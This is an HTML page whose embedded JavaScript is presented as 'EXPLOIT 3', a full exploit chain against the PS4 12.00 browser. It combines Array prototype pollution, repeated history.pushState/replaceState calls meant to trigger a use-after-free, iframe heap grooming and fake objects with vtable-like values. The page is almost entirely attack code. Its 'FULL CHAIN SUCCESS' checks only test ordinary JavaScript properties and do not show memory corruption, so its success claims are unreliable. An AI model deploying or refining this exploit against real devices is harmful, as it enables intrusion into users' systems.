<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - Combined Primitives + UAF</title>
</head>
<body>
<h2>PS4 12.00 - Pollution + Reentrancy + UAF Trigger</h2>
<p>Status: <span id="status">Ready</span></p>

<button onclick="runFullChain()">EXPLOIT 3 - Full Chain (Pollution + Getter + UAF)</button>

<pre id="log"></pre>

<script>
const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");

function log(m){ 
  logEl.textContent += m + "\n";
  logEl.scrollTop = logEl.scrollHeight;
}
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

var keepAlive = [];

// UAF trigger constants (from your original discovery)
const BASE = 977;
const STEP = 14461;
const UAF_ITERS = 48;

// =====================================================
// EXPLOIT  - Full Chain
// =====================================================
async function runFullChain(){
  logEl.textContent = "";
  keepAlive = [];
  statusEl.textContent = "Running Full Chain...";
  
  log("=== EXPLOIT 3: Full Chain (Pollution + Getter + UAF) ===\n");
  log("Goal: Combine all primitives for maximum effect\n");
  
  // Setup pollution
  log("[SETUP] Setting up pollution");
  
  Array.prototype.fakeStructureID = 0x11223344;
  Array.prototype.fakeButterfly = 0x55667788;
  Array.prototype.fakeLength = 0x1000;
  
  log("  Pollution active\n");
  
  let getterFired = 0;
  let allocatedObjects = [];
  
  log("[PHASE 1] Full UAF chain");
  
  let size = BASE;
  
  for(let i=0; i<UAF_ITERS; i++){
    let state = {
      index: i,
      data: [0x41, 0x42, 0x43, 0x44],
      get exploit() {
        getterFired++;
        
        if(i >= 45) { // Very close to crash point
          log(`  ðŸ”¥ CRITICAL GETTER at ITER ${i}`);
          log(`    history.length: ${history.length}`);
          log(`    Pollution active: ${this.data.fakeStructureID === 0x11223344}`);
          
          // Allocate fake objects
          for(let j=0; j<100; j++) {
            let fakeObj = {
              vtable: 0xAABBCCDD,
              data: new ArrayBuffer(128),
              index: i * 100 + j
            };
            allocatedObjects.push(fakeObj);
          }
          
          log(`    Allocated 100 fake objects`);
          
          // Check if pollution is accessible
          if(this.data.fakeStructureID) {
            log(`    fakeStructureID: 0x${this.data.fakeStructureID.toString(16)}`);
          }
        }
        
        return "EXPLOIT_" + i;
      }
    };
    
    let frag = "E".repeat(size);
    
    history.pushState(state, "", "#" + frag);
    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
    
    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
    
    if(i % 10 === 0) {
      log(`  ITER ${i}: size=${size}`);
    }
    
    size += STEP;
    await sleep(5);
  }
  
  log(`\n  UAF complete, getter fired ${getterFired} times\n`);
  
  await sleep(120);
  
  // Heap grooming
  log("[PHASE 2] Heap grooming");
  let frames = [];
  for(let i=0; i<80; i++){
    let f = document.createElement("iframe");
    document.body.appendChild(f);
    try {
      let d = f.contentDocument;
      d.open();
      d.write("<html><body>G</body></html>");
      d.close();
    } catch(e){}
    frames.push(f);
  }
  frames.forEach(f=>f.remove());
  
  await sleep(80);
  
  // Verify combined primitives
  log("\n[PHASE 3] Verifying combined primitives");
  
  log(`Allocated objects: ${allocatedObjects.length}`);
  
  // Check fake objects
  let validFakes = 0;
  for(let obj of allocatedObjects) {
    if(obj.vtable === 0xAABBCCDD && obj.data) {
      validFakes++;
    }
  }
  
  log(`Valid fake objects: ${validFakes}/${allocatedObjects.length}`);
  
  // Check pollution in history
  if(history.state && history.state.data) {
    log("\nCurrent state pollution:");
    log(`  fakeStructureID: 0x${(history.state.data.fakeStructureID || 0).toString(16)}`);
    log(`  fakeButterfly: 0x${(history.state.data.fakeButterfly || 0).toString(16)}`);
    log(`  fakeLength: 0x${(history.state.data.fakeLength || 0).toString(16)}`);
  }
  
  // Navigate and check
  log("\n[PHASE 4] Navigate through states");
  
  for(let i=0; i<5; i++) {
    history.back();
    await sleep(50);
    
    if(history.state && history.state.data) {
      let struct = history.state.data.fakeStructureID || 0;
      log(`  Back ${i}: index=${history.state.index}, struct=0x${struct.toString(16)}`);
      
      // Try to trigger type confusion
      try {
        let len = history.state.data.length;
        let fakelen = history.state.data.fakeLength;
        
        if(fakelen && fakelen !== len) {
          log(`    Length mismatch: real=${len}, fake=0x${fakelen.toString(16)}`);
          log(`    ðŸš¨ TYPE CONFUSION DETECTED!`);
        }
      } catch(e) {}
    }
  }
  
  // Cleanup
  delete Array.prototype.fakeStructureID;
  delete Array.prototype.fakeButterfly;
  delete Array.prototype.fakeLength;
  
  log("\n=== EXPLOIT 3 END ===");
  
  if(validFakes > 0 && history.state && history.state.data.fakeStructureID) {
    log("\nâœ“âœ“âœ“ FULL CHAIN SUCCESS âœ“âœ“âœ“");
    log("âœ“ Pollution active through UAF");
    log("âœ“ Getter executed in critical window");
    log("âœ“ Fake objects allocated");
    log("âœ“ Type confusion possible");
    statusEl.textContent = "FULL CHAIN SUCCESS";
  }
}

</script>
</body>
</html>
